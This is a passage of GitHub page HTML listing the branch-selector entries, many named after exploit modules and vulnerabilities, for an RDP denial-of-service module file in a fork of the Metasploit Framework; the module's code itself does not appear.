                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-zenworks_preboot_op4c_bof">jvazquez-r7-zenworks_preboot_op4c_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/jvazquez-r7-zenworks_preboot_op6c_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="jvazquez-r7-zenworks_preboot_op6c_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="jvazquez-r7-zenworks_preboot_op6c_bof">jvazquez-r7-zenworks_preboot_op6c_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/kernelsmith-post_file_rename2/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="kernelsmith-post_file_rename2"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="kernelsmith-post_file_rename2">kernelsmith-post_file_rename2</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/kingview_kingmess_kvl/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="kingview_kingmess_kvl"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="kingview_kingmess_kvl">kingview_kingmess_kvl</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/kloxo_lxsuexec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="kloxo_lxsuexec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="kloxo_lxsuexec">kloxo_lxsuexec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/linksys_e1500_more_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="linksys_e1500_more_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="linksys_e1500_more_work">linksys_e1500_more_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/linksys_m1k3_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="linksys_m1k3_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="linksys_m1k3_work">linksys_m1k3_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/linksys_wrt54gl_exec_try_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="linksys_wrt54gl_exec_try_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="linksys_wrt54gl_exec_try_fix">linksys_wrt54gl_exec_try_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/linksys_wrt54gl_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="linksys_wrt54gl_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="linksys_wrt54gl_work">linksys_wrt54gl_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/load_runner_research/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="load_runner_research"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="load_runner_research">load_runner_research</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/local_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="local_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="local_cleanup">local_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="master">master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/master-web-modules/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="master-web-modules"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="master-web-modules">master-web-modules</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/maxthon/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="maxthon"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="maxthon">maxthon</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/maxthon_history_xcs_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="maxthon_history_xcs_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="maxthon_history_xcs_cleanup">maxthon_history_xcs_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mediawiki_svg/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mediawiki_svg"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mediawiki_svg">mediawiki_svg</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/meterpreter-submodule/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="meterpreter-submodule"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="meterpreter-submodule">meterpreter-submodule</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/miniupnp_dos_clean/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="miniupnp_dos_clean"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="miniupnp_dos_clean">miniupnp_dos_clean</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mipsbe_elf/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mipsbe_elf"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mipsbe_elf">mipsbe_elf</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mipsle_elf_support/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mipsle_elf_support"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mipsle_elf_support">mipsle_elf_support</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/moinmoin_restore/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="moinmoin_restore"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="moinmoin_restore">moinmoin_restore</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/moinmoin_twikidraw/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="moinmoin_twikidraw"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="moinmoin_twikidraw">moinmoin_twikidraw</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/morisson-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="morisson-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="morisson-master">morisson-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mrmee-cmdsnd_ftp_exploit/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mrmee-cmdsnd_ftp_exploit"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mrmee-cmdsnd_ftp_exploit">mrmee-cmdsnd_ftp_exploit</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mrmee-module-CVE-2011-2110/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mrmee-module-CVE-2011-2110"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mrmee-module-CVE-2011-2110">mrmee-module-CVE-2011-2110</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ms09-022/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ms09-022"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ms09-022">ms09-022</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ms12-005_mod/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ms12-005_mod"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ms12-005_mod">ms12-005_mod</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ms13_005_hwnd_broadcast/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ms13_005_hwnd_broadcast"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ms13_005_hwnd_broadcast">ms13_005_hwnd_broadcast</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ms13_009_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ms13_009_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ms13_009_work">ms13_009_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ms13_037_svg_dashstyle/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ms13_037_svg_dashstyle"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ms13_037_svg_dashstyle">ms13_037_svg_dashstyle</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mubix-ask_localport/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mubix-ask_localport"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mubix-ask_localport">mubix-ask_localport</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mubix-tcpnetstat/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mubix-tcpnetstat"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mubix-tcpnetstat">mubix-tcpnetstat</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/mutiny_subnetmask_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="mutiny_subnetmask_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="mutiny_subnetmask_exec">mutiny_subnetmask_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/nagios_nrpe_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="nagios_nrpe_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="nagios_nrpe_work">nagios_nrpe_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/netcat_gaping/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="netcat_gaping"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="netcat_gaping">netcat_gaping</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/netcat_note/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="netcat_note"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="netcat_note">netcat_note</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/netcat_openbsd/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="netcat_openbsd"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="netcat_openbsd">netcat_openbsd</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/netcat_payloads/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="netcat_payloads"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="netcat_payloads">netcat_payloads</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/netgear_review/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="netgear_review"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="netgear_review">netgear_review</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/netiq_pum_eval/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="netiq_pum_eval"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="netiq_pum_eval">netiq_pum_eval</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/nginx_got_dereferencing/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="nginx_got_dereferencing"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="nginx_got_dereferencing">nginx_got_dereferencing</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/notes_handler_cmdinject/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="notes_handler_cmdinject"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="notes_handler_cmdinject">notes_handler_cmdinject</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/novell_client_nicm/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="novell_client_nicm"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="novell_client_nicm">novell_client_nicm</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/novell_client_nwfs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="novell_client_nwfs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="novell_client_nwfs">novell_client_nwfs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/novell_edirectory_ncp_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="novell_edirectory_ncp_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="novell_edirectory_ncp_bof">novell_edirectory_ncp_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/novell_groupwise_gwcls1_actvx/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="novell_groupwise_gwcls1_actvx"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="novell_groupwise_gwcls1_actvx">novell_groupwise_gwcls1_actvx</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/olliwolli-sharepointadfs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="olliwolli-sharepointadfs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="olliwolli-sharepointadfs">olliwolli-sharepointadfs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/openemr_upload_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="openemr_upload_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="openemr_upload_exec">openemr_upload_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/openpli_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="openpli_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="openpli_work">openpli_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/oracle_webcenter_actvx/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="oracle_webcenter_actvx"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="oracle_webcenter_actvx">oracle_webcenter_actvx</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/osvdb_93696/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="osvdb_93696"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="osvdb_93696">osvdb_93696</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/osvdb_flashchat/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="osvdb_flashchat"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="osvdb_flashchat">osvdb_flashchat</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/osvdb_refs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="osvdb_refs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="osvdb_refs">osvdb_refs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/outpost_local/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="outpost_local"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="outpost_local">outpost_local</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ovftool_format_string_browser/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ovftool_format_string_browser"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ovftool_format_string_browser">ovftool_format_string_browser</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ovftool_format_string_fileformat/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ovftool_format_string_fileformat"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ovftool_format_string_fileformat">ovftool_format_string_fileformat</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/pcanywhere_login/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="pcanywhere_login"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="pcanywhere_login">pcanywhere_login</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/persistence_vbs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="persistence_vbs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="persistence_vbs">persistence_vbs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/php_cgi_arg_injection_plesk/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="php_cgi_arg_injection_plesk"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="php_cgi_arg_injection_plesk">php_cgi_arg_injection_plesk</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/php_wordpress_total_cache/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="php_wordpress_total_cache"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="php_wordpress_total_cache">php_wordpress_total_cache</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/phpldapadmin_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="phpldapadmin_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="phpldapadmin_fix">phpldapadmin_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
